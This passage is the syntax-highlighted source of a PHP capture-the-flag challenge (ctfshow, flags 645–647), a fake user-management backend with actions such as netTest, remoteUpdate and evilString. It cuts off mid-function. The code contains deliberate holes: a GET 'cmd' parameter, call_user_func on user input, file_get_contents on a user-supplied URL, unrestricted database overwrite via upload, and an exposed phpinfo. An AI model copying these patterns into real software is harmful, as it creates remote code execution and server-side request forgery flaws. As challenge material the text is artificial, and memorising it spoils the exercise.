class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-26 10:25:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-08-01 01:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(DB_PATH);</span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">getUsers</span>(<span class="variable">$data</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">addUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">delUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">updateUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;backup&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">backupUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">recoveryUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;phpInfo&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">phpInfoTest</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;netTest&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">netTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;remoteUpdate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">remoteUpdate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;update_address&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;authKeyValidate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">authKeyValidate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilString&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilString</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilNumber&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilNumber</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilFunction&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilFunction</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilArray&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilArray</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilClass&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilClass</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$page</span>=<span class="number">1</span>,<span class="variable">$limit</span>=<span class="number">10</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取成功&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;data&#x27;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;否&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;无&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$users</span>);</span><br><span class="line"><span class="variable">$index</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$u</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;是&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;flag就是管理员的密码，不过我隐藏了&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;删除此条记录后flag就会消失&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$index</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$pass</span>,</span><br><span class="line"><span class="string">&#x27;isAdmin&#x27;</span>=&gt;<span class="variable">$isadmin</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span></span><br><span class="line">));</span><br><span class="line"><span class="variable">$index</span> +=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="variable">$index</span>;</span><br><span class="line"><span class="variable">$start</span> = (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="title function_ invoke__">array_slice</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$start</span>,<span class="variable">$limit</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;添加成功&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户已存在&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;更新成功&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户不存在或无权更新&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;删除成功&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户不存在或无权删除&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backupUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_name</span> = DB_PATH;</span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">file_exists</span> (<span class="variable">$file_name</span> )) &#123;    </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 NOT FOUND&#x27;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span> (<span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>));  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-Disposition: attachment; filename=backup.dat&quot;</span>);     </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(FLAG645, <span class="string">&#x27;flag就在这里，可惜不能给你&#x27;</span>, <span class="title function_ invoke__">fread</span> ( <span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>)));    </span><br><span class="line">    <span class="title function_ invoke__">fclose</span> ( <span class="variable">$file</span> );    </span><br><span class="line">    <span class="keyword">exit</span> ();    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$total</span>, <span class="variable">$times</span>, <span class="variable">$min</span>, <span class="variable">$max</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$min</span> * <span class="variable">$times</span> &gt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$max</span> * <span class="variable">$times</span> &lt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$times</span> &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$times</span>--;</span><br><span class="line">            <span class="variable">$kmix</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$min</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$max</span>);</span><br><span class="line">            <span class="variable">$kmax</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$max</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$min</span>);</span><br><span class="line">            <span class="variable">$kAvg</span> = <span class="variable">$total</span> / (<span class="variable">$times</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$kDis</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$kAvg</span> - <span class="variable">$kmix</span>, <span class="variable">$kmax</span> - <span class="variable">$kAvg</span>);</span><br><span class="line">            <span class="variable">$r</span> = ((<span class="keyword">float</span>)(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) / <span class="number">10000</span>) - <span class="number">0.5</span>) * <span class="variable">$kDis</span> * <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$k</span> = <span class="title function_ invoke__">round</span>(<span class="variable">$kAvg</span> + <span class="variable">$r</span>);</span><br><span class="line">            <span class="variable">$total</span> -= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="variable">$k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recoveryUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;恢复成功&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&lt;<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable">$file_name</span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_name</span>, DB_PATH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;数据恢复失败 file_name&#x27;</span>.<span class="variable">$file_name</span>.<span class="string">&#x27; DB_PATH=&#x27;</span>.DB_PATH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;数据恢复失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpInfoTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authKeyValidate</span>(<span class="params"><span class="variable">$auth</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;验证成功&#x27;</span>:<span class="string">&#x27;验证失败&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remoteUpdate</span>(<span class="params"><span class="variable">$auth</span>,<span class="variable">$address</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;更新失败&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>!==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;权限key验证失败&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$address</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=(<span class="variable">$content</span>!==<span class="literal">false</span>?<span class="variable">$content</span>:<span class="string">&#x27;地址不可达&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilString</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;372619038&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not 372619038?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilClass</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span 